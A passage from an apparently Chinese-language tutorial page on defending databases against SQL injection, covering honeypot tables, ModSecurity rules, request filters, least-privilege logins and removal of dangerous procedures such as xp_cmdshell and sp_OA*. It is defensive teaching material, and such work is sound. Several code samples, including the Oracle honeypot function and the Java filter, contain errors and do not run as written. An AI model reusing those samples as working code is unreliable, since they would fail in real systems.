aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通过设计来避免SQL注入的危险"><a href="#通过设计来避免SQL注入的危险" class="headerlink" title="通过设计来避免SQL注入的危险"></a>通过设计来避免SQL注入的危险</h3><h4 id="使用储存过程"><a href="#使用储存过程" class="headerlink" title="使用储存过程"></a>使用储存过程</h4><p>在大多数数据库中使用存储过程时都可以在数据库层配置访问控制。通过正确配置许可权限来保证攻击者无法访问数据库中的敏感信息。</p><h4 id="使用抽象层"><a href="#使用抽象层" class="headerlink" title="使用抽象层"></a>使用抽象层</h4><p>表示、业务逻辑和数据访问定义不同的层，从而将每一层的实现从总体设计中抽象出来。</p><h4 id="处理敏感数据"><a href="#处理敏感数据" class="headerlink" title="处理敏感数据"></a>处理敏感数据</h4><p>考虑数据库中敏感信息的存储和访问。</p><p>口令：如果可能的话，不应该在数据库中存储用户口令。比较安全的做法是存储每个用户口令的加盐（salted）单向哈希（使用SHA256这样的安全哈希算法）而不是口令本身。</p><p>信用卡及其他财务信息：应该使用认可的（比如FIPS认证过的）加密算法来对信用卡等信息进行加密，然后存储加密后的明细数据。</p><p>存档：如果未要求应用程序保存提交给它的所有敏感信息（例如个人可识别的信息）的完整历史记录，就应考虑每隔一段合理的时间就存档或清除这些不需要的信息。</p><h4 id="避免明显的对象名"><a href="#避免明显的对象名" class="headerlink" title="避免明显的对象名"></a>避免明显的对象名</h4><p>为关键对象（比如加密函数、口令列和信用卡列）选取名称时应该 格外小心，不要选取易被拆解的名字，如passwd</p><h4 id="创建honeypot-蜜罐"><a href="#创建honeypot-蜜罐" class="headerlink" title="创建honeypot(蜜罐)"></a>创建honeypot(蜜罐)</h4><p>如果希望在有人尝试从数据库读取口令时收到警告，可以创建一种带password列（包含假数据）的附加honeypot（蜜罐）表。如果假数据被选中，那么应用管理员将会收到一封e-mail。</p><p>在 Oracle中，可以使用虚拟专用数据库（Virtual Private Database, VPD）来实现</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--创建蜜罐表</span><span class="token keyword">create</span> <span class="token keyword">table</span> app_user<span class="token punctuation">.</span>tblusers <span class="token punctuation">(</span><span class="token operator">is</span> number<span class="token punctuation">,</span> name varchar2<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password varchar2 <span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--创建向管理员发送e-mail的策略函数</span><span class="token comment">--必须用另外一个模式来创建该函数，比如secuser</span><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> secuser<span class="token punctuation">.</span><span class="token keyword">function</span> get_cust_idp_schema <span class="token operator">in</span> varchar2<span class="token punctuation">,</span>p_table <span class="token operator">in</span> varchar2<span class="token punctuation">)</span><span class="token keyword">return</span> varchar2<span class="token keyword">as</span>v_connection UTL_SMTP<span class="token punctuation">.</span>CONNECTION<span class="token punctuation">;</span><span class="token keyword">begin</span>v_connection :<span class="token operator">=</span> UTL_SMTP<span class="token punctuation">.</span>OPEN_CONNECTION<span class="token punctuation">(</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>HELO<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>MAIL<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'app@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>RCPT<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'admin@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span><span class="token keyword">DATA</span><span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'WARNING! SELECT PERFORMED ON HONEYPOT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> UTL_SMTP<span class="token punctuation">.</span>QUIT<span class="token punctuation">(</span>v_connection<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">'1=1'</span> <span class="token punctuation">;</span><span class="token comment">--总是显示整个表</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token comment">--将策略函数赋值给蜜罐表TBLUSERS</span><span class="token keyword">exec</span> dbms_rls<span class="token punctuation">.</span>add_policy <span class="token punctuation">(</span><span class="token string">'APP_USER'</span><span class="token punctuation">,</span><span class="token string">'TBLUSERS'</span><span class="token punctuation">,</span><span class="token string">'GET_CUST_ID'</span><span class="token punctuation">,</span><span class="token string">'SECUSER'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'SELECT, INSERT, UPDATE, DELETE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附加的安全开发资源"><a href="#附加的安全开发资源" class="headerlink" title="附加的安全开发资源"></a>附加的安全开发资源</h4><ul><li><p>OWASP(Open Web Application Security Project，开放式 Web 应用安全项目<a href="http://www.owasp.org/">owasp</a> </p></li><li><p>CWE/SANS 2009 年度25大最危险编程错误(<a href="http://cwe.mitre.org/top25/index.html)%E6%98%AF">http://cwe.mitre.org/top25/index.html)是</a> MITRE (SANS协会)和许多高级安全专家通力合作的成果</p></li><li><p>SANS软件安全协会(<a href="http://www.sans-ssi.org)提供了安全开发方面的培训和证书,以及大量由sans认证检验员提供的参考信息和研究资料./">www.sans-ssi.org)提供了安全开发方面的培训和证书，以及大量由SANS认证检验员提供的参考信息和研究资料。</a></p></li><li><p>Oracle 的 SQL 注入攻击防御指南(<a href="http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9C%89%E5%8A%A9%E4%BA%8E%E5%85%8D%E5%8F%97SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E6%9C%AF%E3%80%82">http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)介绍了很多有助于免受SQL注入攻击的工具和技术。</a></p></li><li><p>SQLSecurity.com(<a href="http://www.sqlsecurity.com)是一个致力于/">www.sqlsecurity.com)是一个致力于</a> Microsoft SQL Server 安全的站点</p></li><li><p>Red-Database-Security(<a href="http://www.red-database-security.com是一个专门研究/">www.red-database-security.com是一个专门研究</a> Oracle 安全的公司。它的网站上包含了很多可供下载的关于Oracle安全的报告和白皮书。</p></li><li><p>Pete Finnegan Limited(<a href="http://petefinnigan.com)也提供了大量用于保证/">http://petefinnigan.com)也提供了大量用于保证</a> Oracle 数据库安全的信息。</p></li></ul><h2 id="平台层防御"><a href="#平台层防御" class="headerlink" title="平台层防御"></a>平台层防御</h2><h3 id="使用运行时保护"><a href="#使用运行时保护" class="headerlink" title="使用运行时保护"></a>使用运行时保护</h3><h4 id="Web应用防火墙"><a href="#Web应用防火墙" class="headerlink" title="Web应用防火墙"></a>Web应用防火墙</h4><p>Web应用防火墙（WAF）是一种网络设备或是一种将安全特性添加到Web应用的基于软件的解决方案。</p><p>基于软件的WAF通常是一些以最小化配置嵌入到Web服务器或应用程序中的模块，它们的主要好处是Web基础结构仍保持不变，并且能够无缝地处理HTTP/HTTPS通信，因为它们运行在承载Web或应用程序的进程中。</p><p>WAF 的事实标准是开源的 <a href="http://www.modsecurity.org/">ModSecurity</a>.ModSecurity被开发成 Apache的一个模块。如果将Apache Web服务器配置成反向代理，那么ModSecurity实际上可以保护任何Web应用，可以使用ModSecurity来实现攻击预防、监控、入侵检测和一般的应用程序加固。</p><p>我们将使用ModSecurity作为主要的例子来介绍使用WAF时在检测并预防SQL注入方面的主要特征。</p><h5 id="可配置规则集"><a href="#可配置规则集" class="headerlink" title="可配置规则集"></a>可配置规则集</h5><p>WAF必须高度可配置才能适应各种不同的情况。</p><p>ModSecurity的威力在于它的规则语言上，这种语言是配置指令和应用到HTTP请求和响应的一种简单编程语言的组合。ModSecurity的SecRule 指令的通用语法，如下所示：</p><pre class="line-numbers language-SecRules" data-language="SecRules"><code class="language-SecRules">SecRule VARIABLE OPERATOR [ACTIONS]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>VARIABLE属性告诉ModSecurity到哪里访问请求或响应，OPERATOR属性告诉ModSecurity如何检查数据，ACTIONS属性确定出现匹配时做哪些操作。ACTIONS属性是可选的规则选项， 它可以定义默认的全局动作。</p><p>ModSecurity核心规则集(ModSecurity Core Rule Set)的 Generic Attacks 规则文件(modsecurity_crs_40_generic_attacks.conf)中的一条实际的黑名单SQL注入规则</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;Location /apps/script.php&gt;SecRule &amp;ARGS "!@eq 1"SecRule ARGS_NAMES "!Astatid$"SecRule ARGS:statID "!^\d{1,3}$"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Location</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="请求覆盖范围"><a href="#请求覆盖范围" class="headerlink" title="请求覆盖范围"></a>请求覆盖范围</h5><p>攻击有效载荷可以出现在HTTP请求的任何位置，比如查询字符串、POST数据、cookie、自定义的或是标准的HTTP头(例如,Referer, Server等)，以及URL路径的部分内容中。ModSecurity能够处理所有这些情况。下面列出了 ModSecurity支持的变量列表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">REQUEST BASENAMEREQUEST BODYREQUEST BODY LENGTHREQUEST COOKIESREQUEST COOKIES NAMESREQUEST FILENAMEREQUEST HEADERSREQUEST HEADERS NAMESREQUEST LINEREQUEST METHODREQUEST PROTOCOLREQUEST URIREQUEST URI RAW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="请求标准化"><a href="#请求标准化" class="headerlink" title="请求标准化"></a>请求标准化</h5><p>ModSecurity能够应对任何复杂的编码场景。它支持大量转换函数，可以将这些函数按任意顺序多次应用到每条规则上。下面列出了 ModSecurity参考手册中的转换函数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">base64Decodebase64DecodeExtbase64EncodecmdLinecompressWhitespacecssDecodeescapeSeqDecodehexDecodehexEncodehtmlEntityDecodejsDecodelengthlowercasemd5nonenormalisePathnormalisePathwinparityEven7bitparityodd7bitparityzero7bitremoveNullsremoveWhitespacereplaceCommentsremoveCommentsCharremoveCommentsreplaceNullsurlDecodeurlDecodeUniurlEncodesha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果内置函数因为某个原因无法满足需求，可以使用ModSecurity支持的Lua脚本语言来构建自定义的转换函数。</p><h5 id="响应分析"><a href="#响应分析" class="headerlink" title="响应分析"></a>响应分析</h5><p>抑制关键信息泄露，比如详细的SQL错误消息。</p><p>ModSecurity核心规则集的Outbound规则文件(modsecurity_ crs_50_ outbound.conf)中的一条实际的带外(outbound)规则</p><p>如果响应中的消息成功匹配了正则表达式(表明产生了SQL错误)，ModSecurity可以做出适当的响应，比如禁止将错误返回给攻击者，或者提供替换的错误编码或错误消息以迷惑自动客户端和扫描器。</p><h5 id="入侵检测能力"><a href="#入侵检测能力" class="headerlink" title="入侵检测能力"></a>入侵检测能力</h5><p>WAF应该可以被动监视应用的行为，遇到可疑的行为时能采用行动，并能在SQL注入事件之后为取证分析(forensic analysis)保持一个不可否认的事件日志。</p><p>使用ModSecurity可以阻止SQL注入攻击、修复已知的SQL注入漏洞、检测攻击企图并抑制那些通常会为SQL注入漏洞利用提供便利的SQL错误消息。</p><h4 id="截断过滤器"><a href="#截断过滤器" class="headerlink" title="截断过滤器"></a>截断过滤器</h4><p>过滤器是WAF的独立模块，可添加新过滤器</p><p>过滤器适合执行跨请求和响应（与核心应用逻辑是松耦合）的集中的、可重复的任务。过滤器还适用于输入验证、将请求/响应记录到日志以及转换输出响应等安全功能。</p><h5 id="Web服务器过滤器"><a href="#Web服务器过滤器" class="headerlink" title="Web服务器过滤器"></a>Web服务器过滤器</h5><p>可以将过滤器实现成Web服务器模块/插件，它们能对核心请求和响应进行扩展以便处理 Web服务器平台的API。Apache、 Netscape（Oracle/Sun）、IIS（Intemet信息服务）等流行的Web服务器平台均支持这种架构。</p><p>ModSecurity是一种能够提供相当多的SQL注入保护的Apache API模块。UrlScan和WebKnight，它们是集成到IIS Web服务器平台的ISAPI过滤器，能够提供SQL注入保护。</p><h5 id="应用程序过滤器"><a href="#应用程序过滤器" class="headerlink" title="应用程序过滤器"></a>应用程序过滤器</h5><p>也可以使用Web应用的编程语言或框架来实现过滤器。其架构与Web服务器插件的架构类似：模块代码在请求和响应经历一系列阶段的过程时执行。可以使用ASP.NET的 System.Web.IHttpModule和javax.servlet.Filter接口来实现过滤器模式，之后可以在不修改代码的前提下将它们添加到应用中并在应用程序的配置文件中显式地激活它们。</p><p>下面列出了自定义的J2EE Filter类的doFilter方法的示例代码。每个请求/响应对会因为J2EE Web源（JSP文件、servlet等）的请求而调用该方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlInjDetectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> res<span class="token punctuation">,</span>chain filterchain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span><span class="token comment">//检查请求数据，寻找恶意字符</span><span class="token function">doDetectSqlI</span><span class="token punctuation">(</span>rep<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用链中的下一个过滤器</span>chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应用程序过滤器确实适合于运行时（runtime）保护，开发时它们可以独立于应用程序，部署时则可以作为独立的.dll或.jar文件并且能立即激活。</p><h5 id="使用脚本语言实现过滤器模式"><a href="#使用脚本语言实现过滤器模式" class="headerlink" title="使用脚本语言实现过滤器模式"></a>使用脚本语言实现过滤器模式</h5><p>就PHP Web应用而言，可以在php.ini文件中利用auto_prepend_file和auto_append_file配置指令，这些指令指向那些在每个请求的PHP脚本执行之前和之后才执行的PHP文件。添加的逻辑在各种HTTP请求集合（查询字符串、POST、cookie、头等）间循环，必要时可以进行验证和或日志记录。</p><p>另一种用于PHP和经典ASP应用的方法是使用包含文件（include file）。这需要通过在每个应用程序页面添加include指令来修改代码。同样，被包含的逻辑也在各种HTTP请求集合间循环，必要时也可以进行验证和或日志记录。</p><h5 id="过滤Web服务消息"><a href="#过滤Web服务消息" class="headerlink" title="过滤Web服务消息"></a>过滤Web服务消息</h5><p>使用自定义的输入和输出过滤器同样可以很容易地将截断过滤器模式应用于XML Web服务。</p><h4 id="不可编辑与可编辑的输入保护"><a href="#不可编辑与可编辑的输入保护" class="headerlink" title="不可编辑与可编辑的输入保护"></a>不可编辑与可编辑的输入保护</h4><p>输入验证策略，将应用程序的输入分成可编辑的和不可编辑的两类，并且锁定不可编辑的输入以便无法操作它们。不可编辑输入是指最终用户不需要直接修改的输入，比如隐藏表单字段、URI和查询字符串参数、cookie等。该策略隐含的原理是：应用程序应该只允许用户执行用户接口暴露给他们的动作。</p><p>实现这种策略的技术范例是HDIV(HTTP Data Integrity Validator, HTTP数据完整性验证器) 和SPF。</p><h4 id="URL策略与页面层策略"><a href="#URL策略与页面层策略" class="headerlink" title="URL策略与页面层策略"></a>URL策略与页面层策略</h4><p>不修改源代码的前提下，为易受攻击的URL或页面打虚拟补丁的技术。</p><h5 id="页面覆写-override"><a href="#页面覆写-override" class="headerlink" title="页面覆写(override)"></a>页面覆写(override)</h5><p>如果页面易受攻击且需要替换，那么可以创建一个在运行时提交的替代页面或类，通过修改Web应用配置文件中的配置可以实现这种替换。在ASP.NET应用中，则可以使用HTTP handler (处理程序)实现这一任务。</p><p>下面展示了一自定义HTTP handler的配置，它用于处理发送给PageVulnToSqll.aspx页面而非易受攻击页面的请求。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpHandlers</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">verb</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PageVulnToSqlI.aspx<span class="token punctuation">"</span></span><span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Chapter9.Examples.SecureAspxHandler, Subclass<span class="token punctuation">"</span></span><span class="token attr-name">validate</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>httpHandlers</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将易受攻击的URL映射到一个通过安全方式处理请求的servlet上</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>chapter9.examples.SecureServletClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servletclass</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--&lt;servlet-name&gt;ServletVulnToSqli&lt;/servlet-name&gt;--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>SecureServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/ServletVulnToSqli<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写"></a>URL重写</h5><p>URL重写(rewrite)是一种与页面覆写(override)类似的技术。可以通过配置Web服务器或应用框架来接收那些发送给易受攻击页面或URL的请求，并将它们重定向到该页面的替代版本。 页面的新版本通过一种安全的方式来实现原始页面逻辑。</p><h5 id="资源代理与封装"><a href="#资源代理与封装" class="headerlink" title="资源代理与封装"></a>资源代理与封装</h5><p>可以将资源代理与封装和页面覆写或URL重写结合使用，以便将替换页面需要的自定义编码数量降至最低。替代页面在处理重写请求时会循环访问请求参数(查询字符串、POST、 cookie等)并执行必需的验证。</p><h4 id="面向方面编程"><a href="#面向方面编程" class="headerlink" title="面向方面编程"></a>面向方面编程</h4><p>面向方面编程(Aspect-Oriented Programming, AOP)是一种构建可应用到应用程序范围内的通用可重用例程的技术。在开发过程中，它有利于核心应用程序逻辑和通用、重复任务(输入 验证、记录日志、错误处理等)的分离。运行时，可以使用AOP来热补(hot-patch)易受SQL注入攻击的应用程序，也可以无须修改底层源代码就直接将入侵检测和日志审查功能嵌入到应用程序中。</p><h4 id="应用程序入侵检测系统"><a href="#应用程序入侵检测系统" class="headerlink" title="应用程序入侵检测系统"></a>应用程序入侵检测系统</h4><p>可以使用传统的基于网络的入侵检测系统(Intrusion Detection Systems, IDS)来检测SQL注入攻击。</p><p>WAF作为一种非常好的IDS，因为它运行在应用层并且可针对受保护 的应用程序进行微调。</p><p>另一种选择是使用PHPIDS<a href="http://phpids.org,phpids不会过滤或审查输入,它检测攻击并根据配置来采取措施./">http://phpids.org，PHPIDS不会过滤或审查输入，它检测攻击并根据配置来采取措施。</a></p><h4 id="数据库防火墙"><a href="#数据库防火墙" class="headerlink" title="数据库防火墙"></a>数据库防火墙</h4><p>防火墙，它本质上是一种介于应用程序和数据库之间的代理服务器。应用程序连接到数据库防火墙并像正常连接到数据库那样发送查询。 数据库防火墙分析预期的查询，如果认为是安全的，就将它传递给数据库服务器加以执行。反之，如果认为是恶意的，就阻止运行该查询。数据库防火墙还可以通过以被动模式监视连接和向管理员发出可疑行为警告来作为恶意数据库行为的应用层IDS。</p><h3 id="确保数据库安全"><a href="#确保数据库安全" class="headerlink" title="确保数据库安全"></a>确保数据库安全</h3><h4 id="锁定应用程序数据"><a href="#锁定应用程序数据" class="headerlink" title="锁定应用程序数据"></a>锁定应用程序数据</h4><h5 id="使用较低权限的数据库登录"><a href="#使用较低权限的数据库登录" class="headerlink" title="使用较低权限的数据库登录"></a>使用较低权限的数据库登录</h5><p>应用程序连接到数据库服务器的登录语境应该是：拥有的许可权限仅仅只能执行需要的应用程序任务。</p><h5 id="隔离数据库登录"><a href="#隔离数据库登录" class="headerlink" title="隔离数据库登录"></a>隔离数据库登录</h5><p>对于既需要写访问也需要读访问数据库的应用程序，可以使用多个用户登录数据库，这是对使用最小权限登录数据库的扩展。</p><h5 id="撤销public许可"><a href="#撤销public许可" class="headerlink" title="撤销public许可"></a>撤销public许可</h5><p>每种数据库服务器平台均拥有通常称为公共（public）角色的默认角色（所有登录均属于这种角色）。它包含一个默认的许可集，其中包括对系统对象的访问。公共角色还被赋予了执行内置系统存储过程、包和用于管理目的的功能的许可。</p><p>应尽可能多地撤销系统对象的公共角色许可。此外，还必须撤销为自定义数据库对象（比如应用程序使用的表和存储过程）赋予的公共角色的冗余许可，必要时可以为自定义角色分配数据库许可。可以使用这些角色来为特定的用户和组赋予默认的访问级别。</p><h5 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h5><p>从安全角度看，应该将应用程序的SQL查询封装到存储过程中并且只能为这些对象赋予EXECUTE许可。可以撤销底层对象的所有其他许可，比如SELECT，INSERT等。就SQL注入而言，最低权限的数据库登录（应用程序使用的存储过程只拥有EXECUTE许可）可保证更难 向浏览器返回任意结果集。</p><h5 id="使用强加密技术来保护存储的敏感数据"><a href="#使用强加密技术来保护存储的敏感数据" class="headerlink" title="使用强加密技术来保护存储的敏感数据"></a>使用强加密技术来保护存储的敏感数据</h5><p>要想避免数据库中敏感数据的非授权查看，一种关键的控制就是使用强加密技术。可选的方法包括存储数据的数学哈希（而非数据本身）或者存储使用对称算法加密后的数据。</p><p>如果不需要存储数据本身，那么请考虑一种正确的衍生数学哈希。</p><p>如果必须存储敏感数据，请使用强对称加密算法来进行保护，比如AES（Advanced Encryption Standard,高级加密标准）或三重DES（Data Encryption Standard,数据加密标准）。加密敏感数据的主要挑战是将密钥保存到攻击者无法轻易访问到的位置。</p><h5 id="维护审查跟踪"><a href="#维护审查跟踪" class="headerlink" title="维护审查跟踪"></a>维护审查跟踪</h5><p>维护对应用程序数据库对象的访问审查跟踪非常关键。</p><h5 id="Oracle错误触发器"><a href="#Oracle错误触发器" class="headerlink" title="Oracle错误触发器"></a>Oracle错误触发器</h5><p>Oracle提供了一种名为数据库触发器的特性。当出现特定的事件时，比如使用DDL（数据定义语言，比如DDL触发器）创建对象时，或者出现数据库错误（比如ERROR触发器）时，这些触发器会在数据库范围内激活，从而提供了一种简易的方法来检测SQL注入尝试。</p><h4 id="锁定数据库服务器"><a href="#锁定数据库服务器" class="headerlink" title="锁定数据库服务器"></a>锁定数据库服务器</h4><h5 id="额外的系统对象锁定"><a href="#额外的系统对象锁定" class="headerlink" title="额外的系统对象锁定"></a>额外的系统对象锁定</h5><p>除了撤销系统对象(system object)上的公共对象许可外，请考虑采取额外的步骤来进一步锁定特权对象的访问，比如用于系统管理的对象、执行操作系统命令和产生网络连接的对象。</p><p>请考虑通过以下措施来施加约束：确保未向应用程序角色赋予多余冗余许可、通过服务器配置禁用访问系统范围内的特权对象，或者彻底将这些功能从服务器删除(避免重新启用带来的权限提升)。</p><p>在Oracle中，应该约束运行操作系统的命令以及从数据库访问操作系统级文件的能力。</p><p>在SQL Server中，应该考虑删除危险的存储过程，比如xp_cmdshell以及与xp_reg*、xp_ instancereg*和sp_OA*匹配的存储过程。</p><h5 id="约束即席查询（ad-hoc-querying）"><a href="#约束即席查询（ad-hoc-querying）" class="headerlink" title="约束即席查询（ad hoc querying）"></a>约束即席查询（ad hoc querying）</h5><p>Microsoft SQL Server支持一种名为OPENROWSET的命令来查询远程和本地数据源。远程查询的有用之处在于可利用它来攻击所连网络上的其他数据库服务器。使用这一功能查询本地服务器，攻击者可以在更高特权的SQL Server数据库登录语境中重新向服务器发出验证。</p><p>Oracle支持借助数据库链接（database link）的远程服务器的即席查询。</p><h5 id="增强对验证周边的控制"><a href="#增强对验证周边的控制" class="headerlink" title="增强对验证周边的控制"></a>增强对验证周边的控制</h5><p>应该复查所有数据库登录，禁用或删除不必要的内容，比如默认账户。</p><h5 id="在最低权限的操作系统账户语境中运行"><a href="#在最低权限的操作系统账户语境中运行" class="headerlink" title="在最低权限的操作系统账户语境中运行"></a>在最低权限的操作系统账户语境中运行</h5><p>如果攻击者能够突破数据库服务器语境并获取底层操作系统的访问权，那么此时是否处于最低权限的操作系统账户语境中将非常关键。</p><h5 id="确保数据库服务器软件打了补丁"><a href="#确保数据库服务器软件打了补丁" class="headerlink" title="确保数据库服务器软件打了补丁"></a>确保数据库服务器软件打了补丁</h5><p>使用当前的补丁保证软件更新至最新是一项基本的安全规则</p><p>判定SQL Server/Oracle数据库服务器版本</p><table><thead><tr><th align="center">数据库</th><th align="center">命令</th><th align="center">版本查阅</th></tr></thead><tbody><tr><td align="center">SQL Server</td><td align="center">select @@version</td><td align="center"><a href="http://support.microsoft.com/kb/321185">http://support.microsoft.com/kb/321185</a></td></tr><tr><td align="center">Oracle</td><td align="center">– 显示数据库版本 select * from v$version; – 显示已安装组件的版本 select * from dba_registry; – 显示补丁级别 select * from dba_registry_history;</td><td align="center"><a href="http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html">http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html</a></td></tr></tbody></table><h3 id="额外的部署考虑"><a href="#额外的部署考虑" class="headerlink" title="额外的部署考虑"></a>额外的部署考虑</h3><h4 id="最小化不必要信息的泄露"><a href="#最小化不必要信息的泄露" class="headerlink" title="最小化不必要信息的泄露"></a>最小化不必要信息的泄露</h4><h5 id="隐藏错误消息"><a href="#隐藏错误消息" class="headerlink" title="隐藏错误消息"></a>隐藏错误消息</h5><p>包含描述数据库服务器失败原因信息的错误消息对SQL注入识别和后续的漏洞利用均非常有用。在应用程序级别的错误处理程序中，处理异常和错误消息隐藏会极其有效。好的做法是配置应用框架或Web服务器，以便在产生未预料的应用程序错误（比如包含500状态码的HTTP响应）时返回自定义响应。配置后的响应可以是显示通用消息的自定义错误页面，也可以重定向到默认的Web页面。</p><p>自定义错误的配置技术</p><table><thead><tr><th align="center">平   台</th><th align="center">配置指令</th></tr></thead><tbody><tr><td align="center">ASP.NET Web应用程序</td><td align="center">在 web.config 文件中，将customErrors 设置为 On 或 RemoteOnly  并将defaultRedirect设置为要显示的页面。确保为defaultRedirect配置的页面确实位于配置的位置，这通常容易出错！<br>  <code>&lt;customErrors  mode="On"  defaultRedirect="/CustomPage.aspx"&gt;  &lt;/customErrors&gt;</code><br>  该配置只适用于ASP.NET资源。当出现任何应用代码无法处理的错误（500、404等）时均会显示该配置页面。</td></tr><tr><td align="center">J2EE Web应用程序</td><td 